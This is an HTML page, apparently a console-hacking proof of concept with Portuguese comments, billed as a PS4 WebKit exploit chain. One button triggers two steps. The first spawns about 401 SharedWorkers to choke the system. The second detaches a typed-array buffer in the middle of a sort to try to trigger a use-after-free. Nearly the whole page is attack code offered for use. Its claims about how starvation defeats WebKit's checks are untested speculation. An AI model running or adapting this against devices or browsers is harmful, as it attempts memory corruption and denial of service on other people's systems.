<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Exploit Chain - SharedWorker + Sort Detach UAF</title>
    
</head>
<body>

    <h2>[+] Exploit Chain: Kernel Starvation -> UAF</h2>
    <p>1. Estrangula o escalonador do FreeBSD (~403 Workers).</p>
    <p>2. Executa um detach assíncrono durante um Array Sort na janela de lentidão.</p>

    <button onclick="runExploitChain()">[ DISPARAR CADEIA DE EXPLOIT ]</button>

    <div id="log">Aguardando comando...<br></div>

    <script>
        let keeps = [];
        const TARGET_CHOKE_ZONE = 401; // Limite de asfixia antes do crash por DoS

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += `> ${msg}<br>`;
            el.scrollTop = el.scrollHeight;
        }

        // --- FASE 1: O Estrangulamento (Stranglehold) ---
        function runExploitChain() {
            if (!window.SharedWorker) return log("SharedWorker API não suportada.");

            log(`[*] FASE 1: Alocando ${TARGET_CHOKE_ZONE} SharedWorkers para asfixiar o Kernel...`);
            let created = 0;
            
            const interval = setInterval(() => {
                for (let i = 0; i < 5; i++) {
                    try {
                        const id = "choke_" + Date.now() + "_" + created;
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
                        sw.port.start(); 
                        keeps.push(sw);
                        created++;

                        if (created >= TARGET_CHOKE_ZONE) {
                            clearInterval(interval);
                            log(`[+] Alvo atingido (${TARGET_CHOKE_ZONE} Workers).`);
                            log("[!] CPU e Kernel comprometidos. Iniciando Fase 2 em 3 segundos...");
                            setTimeout(executeSortDetachUAF, 3000);
                            return;
                        }
                    } catch (e) {
                        clearInterval(interval);
                        log(`[!] Erro de alocação no Worker ${created}. O sistema cedeu mais cedo.`);
                        log("[!] Iniciando Fase 2 imediatamente...");
                        setTimeout(executeSortDetachUAF, 500);
                        return;
                    }
                }
                if (created % 50 === 0) log(`Asfixiando: ${created} workers ativos...`);
            }, 5);
        }

        // --- FASE 2: O Payload de Corrupção (O seu runSortDetach) ---
        function executeSortDetachUAF() {
            log("\n[!!!] FASE 2: EXECUTANDO SORT DETACH NA JANELA DE RACE CONDITION [!!!]");
            
            try {
                const buffer = new ArrayBuffer(1024 * 1024 * 2); // 2MB para garantir processamento lento
                const array = new Uint8Array(buffer);
                
                // Preenche com lixo para o sort processar
                for(let i=0; i < array.length; i++) array[i] = Math.random() * 255;
                
                // Worker fantasma apenas para receber a transferência (detach)
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                let detached = false;
                
                log("[*] Iniciando Array.sort()...");
                
                // O GOLPE: Devido à lentidão extrema da Fase 1, o WebKit vai engasgar 
                // entre a transferência de memória e a verificação de segurança do JIT.
                array.sort((a, b) => {
                    if (!detached) {
                        log("[*] Comparador acionado. Executando postMessage (Detach) do Buffer...");
                        w.postMessage(buffer, [buffer]); 
                        detached = true;
                    }
                    // Retorna um cálculo inútil para forçar a leitura do Array desanexado
                    return a - b; 
                });
                
                log("[-] Sort finalizado. Se o console não crashou, a Race Condition falhou e o WebKit geriu o erro.");
                w.terminate();
                
            } catch(e) {
                // Se cair aqui, o WebKit ainda conseguiu ser rápido o suficiente para lançar o TypeError
                log(`[X] Falha no Payload: O WebKit bloqueou o acesso ilegal. Erro: ${e.message}`);
                log("    Dica: Aumente ou diminua os 403 Workers para encontrar o ponto de asfixia perfeito.");
            }
        }
    </script>
